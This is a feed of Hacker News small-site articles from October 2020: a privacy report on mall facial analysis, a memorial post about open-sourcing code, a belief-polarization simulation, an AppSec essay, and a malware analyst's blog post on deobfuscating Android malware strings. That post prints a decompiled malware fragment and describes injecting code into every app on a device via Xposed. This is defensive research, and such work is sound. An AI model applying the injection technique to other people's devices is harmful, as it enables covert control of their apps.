	<li>
		CF Carrefour Laval in Quebec</li>
</ul>
<p>
	According to a statement from Privacy Commissioner of Canada Daniel Therrien, the company said the goal of its cameras was to ‚Äúanalyze the age and gender of shoppers and not to identify individuals.‚Äù</p>
<p>
	The corporation said that it did not collect personal information because the images were briefly looked at and then deleted, however the information generated from the images was being stored by a third-party contractor called Mappedin, which Cadillac Fairview said it was unaware of.</p>
<p>
	‚ÄúWhen asked the purpose for such collection, Mappedin was unable to provide a response, indicating that the person responsible for programming the code no longer worked for the company,‚Äù reads the report.</p>
<p>
	Therrien notes in his report that Cadillac Fairview not being aware of Mappedin‚Äôs storage of the information ‚Äúcompounded the risk of potential use by unauthorized parties or, in the case of a data breach, by malicious actors.‚Äù</p>
<p>
	In an interview on CTV‚Äôs Power Play, Deputy Commissioner Brent Homan called it a ‚Äúmassive invasion of privacy‚Äù and not one that shoppers would have expected while at the mall. Homan said that one of the lessons Canadians should take away from this report is that facial recognition software is available for companies to use, and while they encourage entities to ask for consent before deploying it on the public, that‚Äôs not always the case.&nbsp;</p>
<p>
	Cadillac Fairview‚Äîone of the largest owners and operators of retail and other properties in North America‚Äî‚Äúexpressly disagreed‚Äù with the investigation‚Äôs findings, telling the commissioners that there were decals placed on shopping mall entry doors noting their privacy policy.</p>
<p>
	These stickers directed visitors to visit guest services to obtain a copy of the company‚Äôs privacy policy, but when the investigators asked a guest services employee at the Eaton location in Toronto, the employee was ‚Äúconfused by the request‚Äù and so Therrien found the stickers to be an ‚Äúinsufficient‚Äù measure.</p>
<p>
	‚ÄúShoppers had no reason to expect their image was being collected by an inconspicuous camera, or that it would be used, with facial recognition technology, for analysis,‚Äù said Therrien in a statement. ‚ÄúThe lack of meaningful consent was particularly concerning given the sensitivity of biometric data, which is a unique and permanent characteristic of our body and a key to our identity.‚Äù</p>
<p>
	The investigation was launched in 2018, following several media reports about information kiosks in malls being equipped with unmarked cameras to monitor visitor demographics. Their examination in this case included visiting Cadillac Fairview‚Äôs Toronto headquarters to interview key personnel, viewing the AVA technology inside the wayfinding directories in action, and extracting records from the directories for forensic analysis.</p>
<p>
	The existence of the software came to light after a user posted an image to Reddit of a display screen at the CF Chinook Centre in Calgary showing coding language including ‚ÄúFaceEncoder‚Äù and ‚ÄúFaceAnalyzer.‚Äù</p>
<p>
	Commissioner Therrien‚Äôs office worked with Alberta Information and Privacy Commissioner Jill Clayton as well as the Information and Privacy Commissioner of British Columbia Michael McEvoy on the investigation.</p>
<p>
	‚ÄúNot only must organizations be clear and up front when customers‚Äô personal information is being collected, they must also have proper controls in place to know what their service providers are doing behind the scenes with that information,‚Äù Clayton said in a statement.</p>
<p>
	The trio of commissioners have expressed concern that the company hasn‚Äôt accepted their request to commit to ensuring meaningful and express consent is obtained from shoppers in the future should it choose to redeploy similar technology in the future.</p>
<p>
	In a statement provided to CTV News, Cadillac Fairview notes that the issue has been resolved, the data deleted, and the cameras have been deactivated. As well, the facial recognition software is no longer in use, but the company says it will not commit to its approach to ‚Äúhypothetical future uses of similar technology.‚Äù</p>
<p>
	‚ÄúThe five million representations referenced in the OPC report are not faces. These are sequences of numbers the software uses to anonymously categorize the age range and gender of shoppers in the camera‚Äôs view,‚Äù the company said. ‚ÄúWe thank the Privacy Commissioner for the report and recommendations on how to further strengthen our privacy practices and agree that the privacy of our visitors must always be a top priority.‚Äù&nbsp;</p>
                                              </div></div>]]>
            </description>
            <link>https://www.ctvnews.ca/canada/5-million-canadian-shoppers-images-collected-at-mall-kiosks-privacy-commissioner-1.5166162</link>
            <guid isPermaLink="false">hacker-news-small-sites-24932467</guid>
            <pubDate>Thu, 29 Oct 2020 16:48:27 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Automated String Deobfuscation]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24932452">thread link</a>) | @todsacerdoti
<br/>
October 29, 2020 | https://www.securify.nl/blog/dynamic-string-deobfuscation-on-android | <a href="https://web.archive.org/web/*/https://www.securify.nl/blog/dynamic-string-deobfuscation-on-android">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><h2 id="introduction">Introduction</h2>
<p>A couple years ago when I analyzed Android malware at <a href="https://www.threatfabric.com/">Threat Fabric</a> we encountered a time consuming problem.
Obfuscated strings, a lot of malware did it and most of them in different ways.
Strings are definitely useful while analyzing malware, they give out a lot of information about what is happening under the hood.</p>
<p>At first we wrote a custom plugin for our decompiler for every type of string obfuscation we encountered.
However, this was very time consuming, so I tried to come up with a more efficient solution.
In this blogpost I will be going over my proposed solution, explain how it works, why I did some things the way I did and the challenges.</p>
<h2 id="problem-definition">Problem definition</h2>
<p>As briefly discussed in the introduction, our main problem is string obfuscation. Here I will be explaining the problem more in-depth, so skip ahead if you are already familiar.</p>
<p>When reverse engineering Android malware, or any malware for that matter, malware authors will try their best to hide their intentions from analysts. Let's look at a real-life sample.</p>
<div data-language="java"><pre><code><span>package</span> <span>com<span>.</span>threesuchm</span><span>;</span>

<span>import</span> <span>android<span>.</span>app<span>.</span>admin<span>.</span></span><span>DeviceAdminReceiver</span><span>;</span>
<span>import</span> <span>android<span>.</span>content<span>.</span></span><span>Context</span><span>;</span>
<span>import</span> <span>android<span>.</span>content<span>.</span></span><span>Intent</span><span>;</span>

<span>public</span> <span>class</span> p044x <span>extends</span> <span>DeviceAdminReceiver</span> <span>{</span>
   <span>public</span> <span>void</span> <span>onDisabled</span><span>(</span><span>Context</span> var1<span>,</span> <span>Intent</span> var2<span>)</span> <span>{</span>
      <span>double</span><span>.</span><span>ifdf</span><span>(</span>var1<span>,</span> <span>class</span><span>.</span><span>fddo</span><span>(</span><span>"8aa669cb198f9845042291e46b13a0c1"</span><span>)</span><span>,</span> <span>false</span><span>)</span><span>;</span>
   <span>}</span>

   <span>public</span> <span>void</span> <span>onEnabled</span><span>(</span><span>Context</span> var1<span>,</span> <span>Intent</span> var2<span>)</span> <span>{</span>
      <span>double</span><span>.</span><span>ifdf</span><span>(</span>var1<span>,</span> <span>class</span><span>.</span><span>fddo</span><span>(</span><span>"8aa669cb198f9845042291e46b13a0c1"</span><span>)</span><span>,</span> <span>true</span><span>)</span><span>;</span>
   <span>}</span>

   <span>public</span> <span>void</span> <span>onReceive</span><span>(</span><span>Context</span> var1<span>,</span> <span>Intent</span> var2<span>)</span> <span>{</span>
      <span>super</span><span>.</span><span>onReceive</span><span>(</span>var1<span>,</span> var2<span>)</span><span>;</span>
   <span>}</span>
<span>}</span></code></pre></div>
<p>Let's unpack this. Something which immediately catches the eye is the use of <code>double</code> here, because in Java the <code>double</code> is a primitive data type and they seem to call a rather strange method. Upon further analysis of the malware it seems they have made their own class which they called <code>double</code>. They probably did this because they attempted to trip up decompilers and more novice analysts.</p>
<p>Another similar type of obfuscation can be seen within the parenthesis of the aforementioned method call. Now suppose we wanted to know what the <code>onEnabled</code> method here does. Firstly they call the following method:</p>
<div data-language="java"><pre><code><span>public</span> <span>static</span> <span>void</span> <span>ifdf</span><span>(</span><span>Context</span> var0<span>,</span> <span>String</span> var1<span>,</span> <span>Boolean</span> var2<span>)</span> <span>{</span>
    var0<span>.</span><span>getSharedPreferences</span><span>(</span><span>class</span><span>.</span><span>fddo</span><span>(</span><span>"83a276cc"</span><span>)</span><span>,</span> <span>0</span><span>)</span><span>.</span><span>edit</span><span>(</span><span>)</span><span>.</span><span>putBoolean</span><span>(</span>var1<span>,</span> var2<span>)</span><span>.</span><span>apply</span><span>(</span><span>)</span><span>;</span>
<span>}</span></code></pre></div>
<p>This method alters the Shared Preferences of the app. As you can see this method takes three arguments,
<code>Context</code>, a <code>String</code> and a <code>Boolean</code>. If we now look at the call site again we can see that the following is passed as a <code>String</code>:</p>
<div data-language="java"><pre><code><span>class</span><span>.</span><span>fddo</span><span>(</span><span>"8aa669cb198f9845042291e46b13a0c1"</span><span>)</span></code></pre></div>
<p>The keyword <code>class</code> is used here, but this is also a class they made themselves, just like <code>double</code>. The signature of this method is:</p>
<div data-language="java"><pre><code><span>public</span> <span>static</span> <span>String</span> <span>fddo</span><span>(</span><span>String</span> var0<span>)</span></code></pre></div>
<p>In other words, it is a method which takes a <code>String</code> and returns a <code>String</code>.
This is what we call string obfuscation. The actual <code>String</code> used here does not appear in the
decompiled code, but is computed at runtime.
So if I want to know what <code>String</code> is computed there, I would need to reverse engineer the method which computes the <code>String</code>.
These methods can be lengthy, there can also be a couple of different ones. More importantly, I need to reverse engineer every obfuscation method for every sample I analyze.
As there are a infinite ways of implementing string obfuscation, reverse engineering string obfuscation is a never-ending endeavour.</p>
<p>SHA256 hash of the sample used:</p>
<p><code>b918f476abaf16b19b0115f22e85a0e2b5946e3b9cb386bf80d5785698472961</code></p>
<h2 id="architecture">Architecture</h2>
<p><img src="https://www.datocms-assets.com/21957/1602234083-stringdeobfuscation.png"></p>
<p>Deobfuscation will be achieved through code injection. We will inject code into every app on the device so we can communicate with it. A server will run on the device which will receive information from my decompiler which runs on my computer. The decompiler first analyzes the code, extracts all necessary information and sends it to the server. The server will send this information to the target-app.
The injected code inside of the target-app will then use this information to hook the deobfuscation method and call it with the provided arguments.
This will result in the deobfuscated strings. These will be sent back to the server, which will send this back to my decompiler, which will show up in my view instead of the method call to deobfuscate a string.</p>
<h3 id="server">Server</h3>
<p>The server running on the Android device opens a socket and waits for a connection. My decompiler will connect to it and send it some information, like the following:</p>
<div data-language="json"><pre><code><span>{</span>
    <span>"data"</span><span>:</span> <span>[</span>
        <span>{</span>
            <span>"static"</span><span>:</span> <span>true</span><span>,</span>
            <span>"methodName"</span><span>:</span> <span>"test"</span><span>,</span>
            <span>"className"</span><span>:</span> <span>"ObfuscationMethods"</span><span>,</span>
            <span>"locationPackage"</span><span>:</span> <span>"nl.securify.stringobfuscationtest"</span><span>,</span>
            <span>"arguments"</span><span>:</span> <span>[</span>
                <span>{</span>
                    <span>"type"</span><span>:</span> <span>"Ljava/lang/String;"</span><span>,</span>
                    <span>"arg"</span><span>:</span> <span>"test"</span>
                <span>}</span>
            <span>]</span>
        <span>}</span>
    <span>]</span><span>,</span>
    <span>"manifestPackagename"</span><span>:</span> <span>"nl.securify.stringobfuscationtest"</span>
<span>}</span></code></pre></div>
<p>This JSON contains all the information necessary to look for the app <code>nl.securify.stringobfuscationtest</code> and calling the <code>test</code> method in class <code>ObfuscationMethods</code> with single <code>String</code> argument <code>"test"</code>.  The server will broadcast this JSON to all the apps on the device using an <code>Intent</code>. The server exposes an <code>IntentService</code> which will receive the deobfuscated strings. Once our target app has send the deobfuscated strings to the <code>IntentService</code>, the server returns it to my decompiler.</p>
<h3 id="code-injection">Code injection</h3>
<p>To achieve code injection we will use the Xposed framework which makes it relatively easy to inject code into an app. The injected code will register a Broadcast Receiver. So every app on the device now exposes a Broadcast Receiver which we can talk to! We essentially created our own API inside of all the other apps on our device.</p>
<p>Upon receiving a broadcast message we will check if the server is requesting something from us. If not, we stop. If it is the current app the server is requesting, the app will read all the information. Using the information it will call the specified methods with the specified arguments. The results of these method calls are the deobfuscated strings. Once all the methods have been called the injected code will send the deobfuscated strings to the server using an <code>Intent</code>. The response will look like this:</p>
<div data-language="json"><pre><code><span>{</span>
    <span>"deobfuscated"</span><span>:</span> <span>[</span>
        <span>"Foobar"</span>
    <span>]</span>
<span>}</span></code></pre></div>
<p>Currently deobfuscation is limited to static-methods only, luckily most string obfuscation solutions use static methods.</p>
<h3 id="client">Client</h3>
<p>Currently I have only implemented a client for the JEB decompiler. The plugin analyzes the currently opened class, searches for predefined signatures, e.g.: A method call which is static, takes a String as input and returns a String as output. It will create a JSON payload like the one in the Server section, send it to the server and wait for a response. Once the response is received the strings will show up in my view instead of method calls to deobfuscate strings.</p>
<p>As the protocol is simple, it should not be too complicated to add support for more decompilers. The biggest hurdle is getting the analysis right.</p>
<h2 id="considerations">Considerations</h2>
<h3 id="why-dynamically">Why dynamically?</h3>
<p>Firstly because it required less work. To me it seemed easier to use code injection as a means to deobfuscate strings than to write my own emulator or use someone else's emulator (which were mostly buggy and hard to use at the time of developing this).</p>
<h3 id="why-xposed">Why Xposed?</h3>
<p>Another attractive <a href="https://github.com/securifybv/xposed-deobfuscation-module">tool</a> would be Frida. Frida is a great tool which I use daily while pentesting mobile apps. However, at the time of developing this tool I was less acquainted with Frida and more so with Xposed. Also, Xposed proves to be more stable than Frida most of the time.</p>
<h2 id="challenges">Challenges</h2>
<h3 id="hookability">Hookability</h3>
<p>For the deobfuscation to succeed we need to be able to hook the app.
However, this can pose to be a challenge.</p>
<p>When analyzing an older malware sample it would check if its C2 (Command &amp; Control) server was up.
If it was not, it would quit and therefore significantly increase the level of difficulty to deobfuscate strings.
I am pretty certain there exists a solution to this, I just have not come around to research what it is.</p>
<p>Lots of Android malware also turned off their main component. This ensures the user does not see the app icon in the app drawer.
But this also means that when the malware terminates itself, you cannot start it by sending a normal <code>Intent</code>.</p>
<p>Also RASP solutions which detect and (technically) prevent hooking will make it harder to use this solution for deobfuscation.</p>
<h2 id="when-to-use">When to use?</h2>
<p>This <a href="https://github.com/securifybv/xposed-deobfuscation-module">tool</a>  can be used when dealing with <code>String</code> obfuscation on the Java layer. Although not every type of obfuscation is supported, it would not be complicated to add support for more ways of <code>String</code> obfuscation on the Java layer.</p>
<h2 id="conclusion">Conclusion</h2>
<p>There is definitely lots that can be improved upon, but it is a nice start.
Whenever I have had to deal with string obfuscation on the Java layer, this tool has helped me deobfuscate most of them.
I hope this tool can help others facing the same issues.</p>
<p>Thanks for reading.</p></div></div>]]>
            </description>
            <link>https://www.securify.nl/blog/dynamic-string-deobfuscation-on-android</link>
            <guid isPermaLink="false">hacker-news-small-sites-24932452</guid>
            <pubDate>Thu, 29 Oct 2020 16:47:28 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Mourning My Father by Open Sourcing Our Code]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24932411">thread link</a>) | @tcgarvin
<br/>
October 29, 2020 | https://www.tcgarvin.com/trafcap | <a href="https://web.archive.org/web/*/https://www.tcgarvin.com/trafcap">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><p><img alt="Pete Garvin" width="100%" src="https://www.tcgarvin.com/images/dad-compressed.jpg"></p><p><em>Tl;dr: I miss my dad.  I <a href="https://github.com/protectus/pfring-to-mongo">published</a> some of the code we wrote together.</em></p><h3>Background</h3><p>The phone call was short.  I asked how he was feeling, and if they had figured out what was going on yet. Dad evaded. They were still getting answers, he said. That was all I needed to hear.  I walked to the nearby park in the Fall air, sat on a bench under a remote tree, and lost my composure.</p><p>Sobbing is a really weird sound, I thought to myself. Gasps and sniffs, heaves, tears, borderline hyperventilation. I was not used to hearing these noises come from me, especially when I had nothing more than my gut to inform my fears.</p><p>But I'd heard it in his voice. Everything was not alright. The world was ending.</p><p>As I grew up, it always seemed a little irrational to me that my deepest terror was losing my dad. At 15 years old, then 20, 25, I never really heard anyone around me talking about how vitally important their dads were to them. And besides, it‚Äôs natural that a son lose his father, rather than a father lose his son. Right? And yet, even after the birth of my own sons reoriented my hopes and fears, the only anxiety late at night that could consistently latch onto my mind ‚Äî and not let go ‚Äî was how much I couldn‚Äôt bear to lose Dad.  Now my literal nightmares materialized.</p><p>Today is the first aniversary of Pete Garvin's death. He died of cancer 4 weeks after his initial diagnosis. The weather report says it will rain all day today from the hurricane. A family friend told me the rain is from him for us, and I believe her.</p><h2>My Motivations, In Brief</h2><p>Before he fell ill, Dad and I would meet one evening a week at his office in Akron and work on little things around his company, <a href="https://www.protectus.com/">Protectus LLC</a>.  I had helped him build the technology side of the company for a couple of years when I got out of school, and the weekly get together was a good way to exercise parts of my brain that my full-time jobs did not.  It wasn‚Äôt lost on me how privileged I was to spend so much time literally being paid to hang out with my own father.  When I look at my career so far, I can trace my success to 3 people.  Dad is at the top of that list.</p><p>I want Dad to be here with me.  I want him to look over my shoulder at this stupid website and tell me that he thinks dark mode is harder to read.  I want to find a way to keep a part of him alive with me, just a little longer.</p><p>So, I‚Äôm trying to finalize our last project together.</p><h2>The Project</h2><p>Protectus was built around a product called <a href="https://www.protectus.com/sentry/">the Sentry</a>.  At its core, the Sentry is a combination network sensor and analytics engine.  It reads bytes off the wire, does some deep (and shallow) packet inspection, and dumps information into a local MongoDB database for post-hoc analysis.  Then there‚Äôs a web app that facilitates queries and reports.  I wrote the frontend right out of school, and Dad took responsibility for the ingest script.  We designed everything together, spent untold hours in front of the whiteboard diagramming, discussing, and deciding.</p><p><img alt="Dad's whiteboard" width="100%" src="https://www.tcgarvin.com/images/whiteboard-compressed.jpg"><em><small>This is the last whiteboarding Dad and I did.  Notice the contributions for/by my son in the corner.  I can't bring myself to erase any of it.</small></em></p><p>Neither of us were rockstar developers.  Dad‚Äôs coding style was informed by C code from the 80s and 90s, with lots of illegible variable names and clever routines that didn't always explain what they were doing.  My code architecture was overly clever and immature, abusing inheritance trees and creating all sorts of extranious abstractions that probably have not aged well.</p><p>We did do some things right, and shipped new Sentry devices to all our existing customers with a year or two of my coming on board.</p><p>The Sentry was not a big commercial success.  I left the company for IBM, and Dad eventually decided to shift cleanly from a product + services company to just a services company.  The Sentry stopped being the main event for the company, and began to be spoken of as just a tool in the toolbox.</p><p>Part of the shift in the Sentry strategy was to open source core parts of the product.  We started with the ingest scripts.  This involved cleaning up the code a bit, and doing some careful git history surgery.  The idea was to publish not just the code, but ship a `pip install`-able module on PyPi.</p><p>I‚Äôve given up on shipping an installable Python module.  PF_RING dropped their repo for the version of Ubuntu we were using to build on Travis, and I don‚Äôt have the time or interest to keep the build running.  But I do want to share the code.</p><p><a href="https://github.com/protectus/pfring-to-mongo">Here's the code.</a></p><p>The code itself is probably not very interesting unless you're into parsing network traffic or aggregating it into Mongo. There are some instructions for getting a dev build running, if you're really keen.  This post isn't really about that.</p><p><img alt="Trafcap Contributors" width="100%" src="https://www.tcgarvin.com/images/trafcap-contributors.jpg"><em><small>Dad and I wrote all the code.  This graph shows a partial history of the ingest code I've released, which was more Dad's than mine.</small></em></p><h2>Seeing Dad in the Code</h2><p>In preparing the code to be released, I spent some time browsing git history and its contents.  At first I was caught off guard by how potent seeing his comments was.  It‚Äôs not like he left jokes around or anything, but this this codebase (including a lot that I‚Äôm not open sourcing today) has his heart and soul in it.</p><pre><code><span><span># Adding vlan id - PFG - April 2014</span><span>
</span></span><span><span></span><span># No way of knowing how long the packet is so add vlan id after timestamp.</span><span>
</span></span><span><span></span><span># If field after timestamp contains dots or colons, then it is a src (mac or ip).</span><span>
</span></span><span><span></span><span># Otherwise, it must be a vlan id.</span><span>
</span></span><span><span></span><span>if</span><span> pkt </span><span>and</span><span> </span><span>not</span><span> doc:
</span></span><span><span>    </span><span># If no vlan id present</span><span>
</span></span><span><span>    </span><span>if</span><span> </span><span>b'.'</span><span> </span><span>in</span><span> pkt[</span><span>1</span><span>] </span><span>or</span><span> </span><span>b':'</span><span> </span><span>in</span><span> pkt[</span><span>1</span><span>]:
</span></span><span><span>        </span><span>if</span><span> pkt[</span><span>4</span><span>] </span><span>in</span><span> pc.leaked_protos_to_ignore: </span><span>return</span><span> (), []
</span></span><span><span>        msg = pkt[</span><span>5</span><span>]
</span></span><span><span>        </span><span>for</span><span> i </span><span>in</span><span> </span><span>range</span><span>(</span><span>6</span><span>, </span><span>len</span><span>(pkt), </span><span>1</span><span>):
</span></span><span><span>            msg = msg + </span><span>b" "</span><span> + pkt[i]
</span></span><span><span>            </span><span># Ensure msg length does not exceed Mongo's Index Key Limit</span><span>
</span></span><span><span>            </span><span>if</span><span> </span><span>len</span><span>(msg) &gt; </span><span>512</span><span>: 
</span></span><span><span>                msg = msg[:</span><span>512</span><span>] + </span><span>b'...'</span><span>
</span></span><span><span>                </span><span>break</span></span></code></pre><p><em><small><a href="https://github.com/protectus/pfring-to-mongo/blob/673415fb721e879f2b3aac9da52dd0454f29f111/trafcap/trafcapEthernetPacket.py#L268">Source</a></small></em></p><p>Dad, your code could be incredibly, uh, organic.  And not always the most deliberate. (sorry) It is exactly what you would expect from a solo C programmer circa 1990, which is basically what dad was.  He would write a passable algorithm the first time, and then tweaked it with if statements over time, resulting in code that was less and less maintainable.  Even though we were working in Python (which I think he really liked), his code structure was the good old C standby of ‚Äúthrow a bunch of functions into a file‚Äù.  The mess of code above started out more copacetically.</p><pre><code><span><span># Adding vlan id - PFG - April 2014</span><span>
</span></span><span><span></span><span># No way of knowing how long the packet is so add vlan id after timestamp.</span><span>
</span></span><span><span></span><span># If field after timestamp contains dots or colons, then it is a src (mac or ip).</span><span>
</span></span><span><span></span><span># Otherwise, it must be a vlan id.</span><span>
</span></span><span>         
</span><span><span></span><span>if</span><span> pkt </span><span>and</span><span> </span><span>not</span><span> doc:
</span></span><span><span>    </span><span># If no vlan id present</span><span>
</span></span><span><span>    </span><span>if</span><span> </span><span>'.'</span><span> </span><span>in</span><span> pkt[</span><span>1</span><span>] </span><span>or</span><span> </span><span>':'</span><span> </span><span>in</span><span> pkt[</span><span>1</span><span>]:
</span></span><span><span>        msg = pkt[</span><span>5</span><span>]
</span></span><span><span>        </span><span>for</span><span> i </span><span>in</span><span> </span><span>range</span><span>(</span><span>6</span><span>, </span><span>len</span><span>(pkt), </span><span>1</span><span>):
</span></span><span><span>            msg = msg + </span><span>" "</span><span> + pkt[i]</span></span></code></pre><p><em><small><a href="https://github.com/protectus/pfring-to-mongo/blob/821b42c5a8c68b0f2ca4b50773f391724eeea592/python/protectus-sentry/protectus_sentry/trafcap/trafcapEthernetPacket.py#L233">Source</a></small></em></p><p>... Still not beautiful, and you have to know what pkt and doc are, because they‚Äôre definitely not self-documenting, but you know, better.</p><p>And the stuff really worked. Dad understood better than most the value of simplicity in software architecture.  Even though our system was spread across several processes, and each process might interact directly with the database, (a pattern that elicits shrieks of rage from most software designers I know,) every interaction was well documented and the documentation strictly updated.  The flow of data was one-directional, and the state space was kept under tight control.  We were careful not to introduce too many dependencies.  The only frameworks we used were Debian Packaging, Pyramid, and BackboneJS.  Everything else was a library.  Though much of it was handwritten, the documentation was at least as good as any enterprise dev team I‚Äôve encountered since. (Though not as good as most open source projects I‚Äôve seen)</p><p>As we scaled the Sentry onto higher volume networks, Python started to groan a bit under the load.  I ported a bunch of his ingest code to Cython over a few months, and Lo, his ‚Äúlet‚Äôs code this like it‚Äôs C‚Äù approach fit really intuitively with Cython‚Äôs ‚Äúlet‚Äôs turn this into C‚Äù approach.</p><p>You can‚Äôt buy the kind of startup experience I got working with Dad.  Every mistake I made, every design decision, I was the one who had to take responsibility with the repercussions, just because we were a two-man shop, and he trusted me.  I haven‚Äôt found that kind of learning environment anywhere else.</p><p>Technical things I learned from or with Dad:</p><ul><li>Early on we recognized the value a monorepo could bring, years before anyone used that word</li><li>I hammered together a CI/CD pipeline from batch scripts. We judged Jenkins to be more infrastructure than we needed</li><li>Instead of local environments, we developed remotely on instances of production environments, sidestepping an entire class of deployment issues</li><li>We maintained multiple release channels and used feature flags to let us quickly respond to customers who wanted more now, without endangering customers who were happy with stability</li><li>We managed an entire fleet of machines with only a few hours a month to coordinate software upgrades</li></ul><p><strong>More important yet</strong> was the concept Dad gave me that wearing lots of hats is fun.  If you're from the future, wondering if I'd be a good fit at your company, just know that I will probably not be happy doing only one kind of work.  With Dad, I:</p><ul><li>Slung Code in Python, Cython, JS and Bash</li><li>Administered a Xen VM farm</li><li>Designed a product UI</li><li>Obtained my GPEN certification and performed pen testing against clients (because we were a security company)</li><li>Used my own product to monitor client networks for security incidents</li><li>Solicited customer feedback to improve my product</li><li>Did sales engineering and support</li><li>Designed implemented and shipped a marketing site (yes it's bad, but it's mine)</li><li>Designed and chose chips for a custom form factor Ethernet tap, and worked with the hardware design firm to design and then test their prototypes</li></ul><p><strong>Even more important yet</strong> were the non-work things Dad taught me.  But that's a little out of scope today.</p><h2>I ‚Ä¶</h2></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.tcgarvin.com/trafcap">https://www.tcgarvin.com/trafcap</a></em></p>]]>
            </description>
            <link>https://www.tcgarvin.com/trafcap</link>
            <guid isPermaLink="false">hacker-news-small-sites-24932411</guid>
            <pubDate>Thu, 29 Oct 2020 16:43:35 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Social learning and peer selection lead to polarized beliefs]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24932379">thread link</a>) | @bldavies
<br/>
October 29, 2020 | https://bldavies.com/blog/polarized-beliefs-social-networks/ | <a href="https://web.archive.org/web/*/https://bldavies.com/blog/polarized-beliefs-social-networks/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>




<p>Suppose 50 people each have four friends.
Everyone believes that some proposition‚Äîsay, ‚Äúcorporate tax rates should be higher‚Äù‚Äîis either true or false, with equal probability and independently of everyone else.
Consequently, the social network among the 50 people is unsorted with respect to peoples‚Äô beliefs.
However, the network‚Äôs structure changes over time, in discrete time steps, according to two rules:</p>
<ol>
<li>everyone updates their belief to match the majority within their friend group (comprised of themselves and their neighbours in the network), defaulting to their previous belief to break ties;</li>
<li>edges appear between people who hold the same belief and disappear between people who hold different beliefs, both with probability 0.01.</li>
</ol>
<p>The first rule describes a ‚Äúsocial learning‚Äù process: people update their beliefs to match the majority among their friends.<sup id="fnref:1"><a href="#fn:1" role="doc-noteref">1</a></sup>
The second rule describes a ‚Äúpeer selection‚Äù process: people choose friends who share the same beliefs.
These two processes can lead to polarized beliefs, even if there is no polarization before the processes begin.
I demonstrate this phenomenon in the figure below, which plots the beliefs and connections in a simulated network after zero, 10, 20, and 30 time steps.
The figure shows how people grow increasingly connected to others with the same belief and decreasingly connected to others with the opposing belief.</p>
<p><img src="https://bldavies.com/blog/polarized-beliefs-social-networks/figures/networks-1.svg" alt=""></p>
<p>The social learning and peer selection processes can lead to polarization both together and separately.
I justify this claim in the figure below.
The left-hand panel plots the network‚Äôs ‚Äúassortativity coefficient,‚Äù which measures the overall correlation among friends‚Äô beliefs.<sup id="fnref:2"><a href="#fn:2" role="doc-noteref">2</a></sup>
This coefficient equals one when all neighbours share the same beliefs (complete polarization) and equals zero when edges are ‚Äúas random.‚Äù
The right-hand panel plots the proportion of people in the network who update their belief at each time step.
Both panels present means and 95% confidence intervals across 30 simulated networks, each with randomized initial beliefs.</p>
<p><img src="https://bldavies.com/blog/polarized-beliefs-social-networks/figures/network-attributes-1.svg" alt=""></p>
<p>The social learning process leads to positive sorting because, by construction, people increasingly share the same beliefs as their friends.
The peer selection process leads to positive sorting because, by construction, edges increasingly connect people with common beliefs only.
The two processes work together to isolate the subnetworks of people who believe the proposition is true and false.
Interestingly, most belief updates occur very early: after about five time steps, most of the structural changes in the social network result from edge creations and deletions rather than from belief updates.</p>
<section role="doc-endnotes">
<hr>
<ol>
<li id="fn:1" role="doc-endnote">
<p>See <a href="https://bldavies.com/blog/degroot-learning-social-networks/">my blog post on DeGroot learning</a> for more discussion of social learning processes. <a href="#fnref:1" role="doc-backlink">‚Ü©Ô∏é</a></p>
</li>
<li id="fn:2" role="doc-endnote">
<p>See <a href="https://arxiv.org/abs/cond-mat/0209450v2">Newman (2003)</a> for a definition and discussion of the assortativity coefficient. <a href="#fnref:2" role="doc-backlink">‚Ü©Ô∏é</a></p>
</li>
</ol>
</section>


</div></div>]]>
            </description>
            <link>https://bldavies.com/blog/polarized-beliefs-social-networks/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24932379</guid>
            <pubDate>Thu, 29 Oct 2020 16:40:12 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The future of AppSec and why I joined r2c]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24932357">thread link</a>) | @mooreds
<br/>
October 29, 2020 | https://r2c.dev/blog/2020/future-of-appsec-why-r2c/ | <a href="https://web.archive.org/web/*/https://r2c.dev/blog/2020/future-of-appsec-why-r2c/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><div><div><div><p>Sometimes, it feels like things happen for a reason.</p>
<p>After a series of unexpected events, I now find myself as Head of Security Research at <a href="https://r2c.dev/" target="_blank" rel="noopener">r2c</a>, the company behind the open source static analysis tool <a href="https://github.com/returntocorp/semgrep" target="_blank" rel="noopener">Semgrep</a>, and I couldn‚Äôt be more excited about my role, the company, and the future of application security (AppSec).</p>
<p>In this post I‚Äôm going to discuss why I‚Äôm betting on r2c, and where I think application security is headed.</p>
<h2>An academic wake up call</h2>
<p><em>A Tale as Old as Time: Things are different outside academia</em> </p>
<p>While I was a young, fresh-faced PhD student at the University of California, Davis, my colleagues and I pursued a number of research projects involving static analysis, and I even interned at Fortify, which was an up-and-coming static analysis security testing (SAST) vendor at the time.</p>
<p>I was amazed and enthralled by the power of static analysis to find bugs and improve software security at scale. Thoughts of other advanced topics like symbolic execution, abstract interpretation, and more joyfully danced through my head like a child‚Äôs dreams of presents at Christmas.</p>
<p>So when I joined NCC Group as a security consultant, I couldn‚Äôt wait to see the tools my colleagues used. After all, these are some of the top security testers in the world, brought in by most of the largest, and biggest name companies to improve the security of their software.</p>
<p>So what secret tools did these legendary security consultants use?</p>
<ol>
<li>Burp Suite</li>
<li>An editor like Emacs, Vim, or VS Code</li>
<li>Aaaand... <code>grep</code> (Pro-tip: use <a href="https://github.com/BurntSushi/ripgrep" target="_blank" rel="noopener">ripgrep</a>, it‚Äôs much faster)</li>
</ol>
<p>How could this be? How could such advanced approaches and tools exist and yet so few people use them?</p>
